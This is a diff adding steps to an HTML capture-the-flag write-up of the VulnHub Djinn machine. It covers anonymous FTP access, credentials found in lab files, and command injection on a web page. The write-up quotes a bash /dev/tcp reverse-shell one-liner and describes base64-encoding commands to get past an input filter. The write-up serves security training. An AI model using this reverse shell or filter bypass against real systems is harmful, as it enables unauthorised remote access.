@@ -34,10 +34,40 @@ layout: default
     <br>
     <h2>Information Gathering</h2>
 
-    
+    <li>I begin with logging into the FTP server.  The creds anonymous:anonymous let me in.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/VulnHub/Djinn/exfiltrated/ftp]&#13;&#10;&boxur;&HorizontalLine;$ ftp 10.0.0.20  &#13;&#10;Connected to 10.0.0.20.&#13;&#10;220 (vsFTPd 3.0.3)&#13;&#10;Name (10.0.0.20:kali): anonymous&#13;&#10;530 Please login with USER and PASS.&#13;&#10;530 Please login with USER and PASS.&#13;&#10;SSL not available&#13;&#10;331 Please specify the password.&#13;&#10;Password:&#13;&#10;230 Login successful.&#13;&#10;Remote system type is UNIX.&#13;&#10;Using binary mode to transfer files.&#13;&#10;ftp&gt; ls&#13;&#10;200 PORT command successful. Consider using PASV.&#13;&#10;150 Here comes the directory listing.&#13;&#10;-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt&#13;&#10;-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt&#13;&#10;-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt&#13;&#10;226 Directory send OK.&#13;&#10;ftp&gt; mget *&#13;&#10;mget creds.txt? y&#13;&#10;200 PORT command successful. Consider using PASV.&#13;&#10;150 Opening BINARY mode data connection for creds.txt (11 bytes).&#13;&#10;226 Transfer complete.&#13;&#10;11 bytes received in 0.00 secs (195.3125 kB/s)&#13;&#10;mget game.txt? y&#13;&#10;200 PORT command successful. Consider using PASV.&#13;&#10;150 Opening BINARY mode data connection for game.txt (128 bytes).&#13;&#10;226 Transfer complete.&#13;&#10;128 bytes received in 0.00 secs (2.7127 MB/s)&#13;&#10;mget message.txt? y&#13;&#10;200 PORT command successful. Consider using PASV.&#13;&#10;150 Opening BINARY mode data connection for message.txt (113 bytes).&#13;&#10;226 Transfer complete.&#13;&#10;113 bytes received in 0.00 secs (2.4492 MB/s)&#13;&#10;ftp&gt; exit&#13;&#10;221 Goodbye.
+    </pre>
+
+    <li>According to the files there is a game of some sort for us to play on port 1337.  There are also credentials in creds.txt that I am going to take note of, nitu:81299</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/VulnHub/Djinn/exfiltrated/ftp]&#13;&#10;&boxur;&HorizontalLine;$ cat creds.txt                                                                                                1 &Cross;&#13;&#10;nitu:81299&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/VulnHub/Djinn/exfiltrated/ftp]&#13;&#10;&boxur;&HorizontalLine;$ cat game.txt &#13;&#10;oh and I forgot to tell you I&apos;ve setup a game for you on port 1337. See if you can reach to the &#13;&#10;final level and get the prize.&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/VulnHub/Djinn/exfiltrated/ftp]&#13;&#10;&boxur;&HorizontalLine;$ cat message.txt &#13;&#10;@nitish81299 I am going on holidays for few days, please take care of all the work. &#13;&#10;And don&apos;t mess up anything.
+    </pre>
+
+    <li>Next I run gobuster against the web server on port 1337.</li>
+
+    <pre>
+
+    </pre>
+
+    <li>This reveals two directories.  The /wish directory leads us to a reverse shell.  On this page we are able to submit commands.  When we submit "whoami" we see www-data returns in the URL that we get redirected to.  So it appears we are getting command execution.  I did this in Burp as shown below.</li>
+
+    <img src="../images/djinn/rce_poc.png">
+
+    <li>However, when we submit other commands such as a reverse shell, "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", it returns with "Wrong+choice+of+words".  It looks like user input is being filtered so I use base64 encoding to get around this.  First I encoded the command with base64 and then I piped the base64 encoded command into bash to be executed.</li>
+    <ul>
+        <li>Here I demonstrate/test</li>
+        <img src="../images/djinn/base64_test.png">
+    </ul>
+
     <br>
     <h2>Foothold</h2>
 
+    <li>Getting shell on Djinn using the base64 encoded command</li>
+
+    <img src="../images/djinn/rce_poc.png">
 
     <br>
     <h2>Privesc - Root</h2>
